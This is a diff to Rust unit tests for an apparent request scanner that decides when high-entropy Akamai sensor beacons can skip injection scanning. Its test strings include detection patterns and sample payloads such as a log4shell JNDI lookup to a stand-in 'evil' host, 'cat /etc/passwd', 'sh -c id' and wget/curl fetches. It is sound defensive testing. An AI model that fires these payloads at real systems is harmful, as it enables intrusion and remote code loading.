@@ -847,15 +847,58 @@ mod tests {
 
     #[test]
     fn beacon_with_injection_shape_is_scanned() {
-        // Padded-to-look-opaque payloads keep the keyword fast-path.
+        // Padded-to-look-opaque payloads keep the keyword fast-path — but
+        // only for HIGH-SPECIFICITY multi-char shapes that don't collide
+        // with random ASCII. Bare `$(` / `` ` `` / `${` / `{{` / `<%` were
+        // dropped (2026-06-18 round-2 FP fix): each appears in ~every 5 KB
+        // sensor beacon by chance and re-admitted the body this gate exists
+        // to skip. See `beacon_with_stray_subshell_metachars_stays_opaque`.
         let h = headers_ct("application/x-www-form-urlencoded");
-        for shape in ["$(id)", "{{7*7}}", "${7*7}", "UNION SELECT", "wget http://x/"] {
+        for shape in [
+            "${jndi:ldap://x/a}",
+            "/bin/sh",
+            "cat /etc/passwd",
+            "sh -c id",
+            "UNION SELECT",
+            "wget http://x/",
+            "curl http://x/",
+            "powershell",
+        ] {
             let body = format!("d={}{}", high_entropy_blob(), shape);
             assert!(
                 !form_body_is_opaque_beacon(&h, &body),
                 "high-signal shape must stay scannable: {shape}"
             );
         }
+    }
+
+    #[test]
+    fn beacon_with_stray_subshell_metachars_stays_opaque() {
+        // 2026-06-18 round-2 FP: real Akamai `sensor_data` beacons are ~5 KB
+        // of high-entropy printable ASCII and contain stray `` `id` `` /
+        // `$(ls)` / `${x}` / `{{y}}` shapes BY CHANCE. Those bare 1–2 char
+        // metacharacters must NOT re-admit the beacon — otherwise the body
+        // scanner re-trips cmdi/sqli on the random blob (the cmdi/sqli FP
+        // root cause). Only high-specificity multi-char tokens re-admit.
+        let mut blob = high_entropy_blob();
+        blob.push_str("q`id`w$(ls)e${x}r{{y}}t");
+        let body = format!("{{\"sensor_data\":\"{blob}\"}}");
+        let h = headers_ct("text/plain;charset=UTF-8");
+        assert!(
+            form_body_is_opaque_beacon(&h, &body),
+            "beacon with only stray bare metachars must stay opaque",
+        );
+    }
+
+    #[test]
+    fn beacon_log4shell_jndi_still_scanned() {
+        // The one multi-char `${…}` shape we must never skip: log4shell.
+        let h = headers_ct("text/plain");
+        let body = format!("{}${{jndi:ldap://evil/a}}", high_entropy_blob());
+        assert!(
+            !form_body_is_opaque_beacon(&h, &body),
+            "log4shell ${{jndi:}} must keep the body scannable",
+        );
     }
 
     #[test]
